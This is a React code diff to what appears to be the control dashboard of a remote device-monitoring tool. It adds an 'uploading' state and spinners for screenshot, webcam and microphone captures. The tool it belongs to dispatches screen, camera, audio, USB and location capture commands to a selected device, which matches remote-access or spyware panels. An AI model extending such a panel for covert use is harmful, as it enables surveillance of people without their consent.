@@ -42,7 +42,8 @@ import {
   Download,
   Timer,
   RotateCcw,
-  Wifi
+  Wifi,
+  Loader2
 } from 'lucide-react';
 
 
@@ -250,6 +251,7 @@ function MainAppContent() {
   const hiddenTerminalInputRef = useRef(null);
 
   // Dispatches a command and polls for response
+  const MEDIA_COMMANDS = ['SCREENSHOT', 'WEBCAM', 'RECORD_AUDIO'];
   const dispatchAndWait = async (type, payload, maxAttempts = 90) => {
     if (!selectedDevice) throw new Error('No device selected');
     const cmd = await commandsAPI.dispatch(selectedDevice.id, type, payload);
@@ -265,6 +267,12 @@ function MainAppContent() {
             if (updatedCmd.status === 'EXECUTED') {
               clearInterval(interval);
               resolve(updatedCmd.result_url || '');
+            } else if (updatedCmd.status === 'UPLOADING' && MEDIA_COMMANDS.includes(type)) {
+              // For media commands, resolve immediately once the agent has captured
+              // and sent the file to the backend. The gallery will show a spinner
+              // until the backend finishes uploading to Cloudinary.
+              clearInterval(interval);
+              resolve('uploading');
             } else if (updatedCmd.status === 'FAILED') {
               clearInterval(interval);
               reject(new Error(updatedCmd.error_message || 'Command execution failed'));
@@ -1226,9 +1234,9 @@ function MainAppContent() {
 
   // Derived States
   const latestTelemetry = telemetry[0] || {};
-  const screenshots = commands.filter(c => c.command_type === 'SCREENSHOT' && c.status === 'EXECUTED' && c.result_url);
-  const webcamCaptures = commands.filter(c => c.command_type === 'WEBCAM' && c.status === 'EXECUTED' && c.result_url);
-  const audioRecordings = commands.filter(c => c.command_type === 'RECORD_AUDIO' && c.status === 'EXECUTED' && c.result_url);
+  const screenshots = commands.filter(c => c.command_type === 'SCREENSHOT' && (c.status === 'EXECUTED' && c.result_url || c.status === 'UPLOADING'));
+  const webcamCaptures = commands.filter(c => c.command_type === 'WEBCAM' && (c.status === 'EXECUTED' && c.result_url || c.status === 'UPLOADING'));
+  const audioRecordings = commands.filter(c => c.command_type === 'RECORD_AUDIO' && (c.status === 'EXECUTED' && c.result_url || c.status === 'UPLOADING'));
   const usbEvents = commands.filter(c => c.command_type === 'USB_EVENT' && c.status === 'EXECUTED');
   const locationCenter = latestTelemetry.latitude && latestTelemetry.longitude 
     ? [latestTelemetry.latitude, latestTelemetry.longitude] 
@@ -2266,7 +2274,7 @@ function MainAppContent() {
                             ) : (
                               <div className="gallery-grid">
                                 {screenshots.map(s => (
-                                  <div key={s.id} className="gallery-card" onClick={() => window.open(s.result_url, '_blank')}>
+                                  <div key={s.id} className="gallery-card" onClick={() => s.status === 'EXECUTED' && s.result_url ? window.open(s.result_url, '_blank') : null} style={{ cursor: s.status === 'UPLOADING' ? 'default' : 'pointer', opacity: s.status === 'UPLOADING' ? 0.8 : 1 }}>
                                     <div className="card-action-overlay">
                                       <button 
                                         className="action-icon-btn btn-trash" 
@@ -2281,10 +2289,19 @@ function MainAppContent() {
                                       </button>
                                     </div>
                                     <div className="gallery-image-wrapper">
-                                      <img src={s.result_url} className="gallery-image" alt="Captured Screenshot" />
+                                      {s.status === 'UPLOADING' ? (
+                                        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '140px', background: 'rgba(0,0,0,0.3)', borderRadius: '8px' }}>
+                                          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '8px' }}>
+                                            <Loader2 size={28} className="spin" style={{ color: 'var(--color-accent)' }} />
+                                            <span style={{ fontSize: '11px', color: 'var(--text-muted)' }}>Uploading to cloud...</span>
+                                          </div>
+                                        </div>
+                                      ) : (
+                                        <img src={s.result_url} className="gallery-image" alt="Captured Screenshot" />
+                                      )}
                                     </div>
                                     <div className="gallery-meta">
-                                      <div className="gallery-title">Screenshot Captured</div>
+                                      <div className="gallery-title">{s.status === 'UPLOADING' ? 'Uploading...' : 'Screenshot Captured'}</div>
                                       <div className="gallery-date">{formatDate(s.updated_at)}</div>
                                     </div>
                                   </div>
@@ -2302,7 +2319,7 @@ function MainAppContent() {
                             ) : (
                               <div className="gallery-grid">
                                 {webcamCaptures.map(w => (
-                                  <div key={w.id} className="gallery-card" onClick={() => window.open(w.result_url, '_blank')}>
+                                  <div key={w.id} className="gallery-card" onClick={() => w.status === 'EXECUTED' && w.result_url ? window.open(w.result_url, '_blank') : null} style={{ cursor: w.status === 'UPLOADING' ? 'default' : 'pointer', opacity: w.status === 'UPLOADING' ? 0.8 : 1 }}>
                                     <div className="card-action-overlay">
                                       <button 
                                         className="action-icon-btn btn-trash" 
@@ -2317,10 +2334,19 @@ function MainAppContent() {
                                       </button>
                                     </div>
                                     <div className="gallery-image-wrapper">
-                                      <img src={w.result_url} className="gallery-image" alt="Webcam Capture" />
+                                      {w.status === 'UPLOADING' ? (
+                                        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '140px', background: 'rgba(0,0,0,0.3)', borderRadius: '8px' }}>
+                                          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '8px' }}>
+                                            <Loader2 size={28} className="spin" style={{ color: 'var(--color-accent)' }} />
+                                            <span style={{ fontSize: '11px', color: 'var(--text-muted)' }}>Uploading to cloud...</span>
+                                          </div>
+                                        </div>
+                                      ) : (
+                                        <img src={w.result_url} className="gallery-image" alt="Webcam Capture" />
+                                      )}
                                     </div>
                                     <div className="gallery-meta">
-                                      <div className="gallery-title">Webcam Snap</div>
+                                      <div className="gallery-title">{w.status === 'UPLOADING' ? 'Uploading...' : 'Webcam Snap'}</div>
                                       <div className="gallery-date">{formatDate(w.updated_at)}</div>
                                     </div>
                                   </div>
@@ -2340,7 +2366,9 @@ function MainAppContent() {
                                 {audioRecordings.map(a => (
                                   <div key={a.id} style={{ background: '#090d16', border: '1px solid var(--border-color)', borderRadius: '8px', padding: '16px', position: 'relative' }}>
                                     <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '12px' }}>
-                                      <span style={{ fontSize: '12px', fontWeight: 'bold', color: 'var(--color-accent)' }}>Microphone Recording</span>
+                                      <span style={{ fontSize: '12px', fontWeight: 'bold', color: 'var(--color-accent)' }}>
+                                        {a.status === 'UPLOADING' ? 'Uploading Recording...' : 'Microphone Recording'}
+                                      </span>
                                       <button 
                                         className="action-icon-btn btn-trash" 
                                         style={{ padding: '4px' }}
@@ -2356,7 +2384,14 @@ function MainAppContent() {
                                     </div>
                                     
                                     <div style={{ marginBottom: '12px' }}>
-                                      <audio controls src={a.result_url} style={{ width: '100%' }} />
+                                      {a.status === 'UPLOADING' ? (
+                                        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '54px', background: 'rgba(0,0,0,0.3)', borderRadius: '8px' }}>
+                                          <Loader2 size={22} className="spin" style={{ color: 'var(--color-accent)', marginRight: '8px' }} />
+                                          <span style={{ fontSize: '12px', color: 'var(--text-muted)' }}>Uploading to cloud...</span>
+                                        </div>
+                                      ) : (
+                                        <audio controls src={a.result_url} style={{ width: '100%' }} />
+                                      )}
                                     </div>
                                     
                                     <div style={{ fontSize: '11px', color: 'var(--text-muted)', display: 'flex', justifyContent: 'space-between' }}>
